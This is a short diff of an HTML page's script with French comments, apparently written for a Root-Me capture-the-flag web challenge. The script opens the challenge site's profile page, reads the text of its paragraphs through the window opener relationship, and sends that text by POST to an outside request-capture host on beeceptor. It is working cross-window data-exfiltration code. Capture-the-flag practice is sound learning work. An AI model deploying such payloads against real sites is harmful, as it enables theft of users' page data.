@@ -16,18 +16,18 @@
 
 <body id="body">
   <script>
+    
     fetch("https://volatile.free.beeceptor.com/todos")
-      
-    window.opener("http://challenge01.root-me.org:58003/login")
-
+    // Récupérer les paragraphes depuis la fenêtre ouverte
     const redirection = window.open("http://challenge01.root-me.org:58003/profile");
     const paragraphs = redirection.opener.document.querySelectorAll('p');
-
-    var text = ""
-      
+    
+    let text = "";
+    
+    // Récupérer tout le texte des balises <p>
     paragraphs.forEach(paragraph => {
-          text = text + paragraph.textContent + "\n"
-        });
+      text = text + paragraph.textContent + "\n";
+    });
       
     fetch("https://volatile.free.beeceptor.com", {
       method: "POST",  // Utiliser POST pour envoyer des données
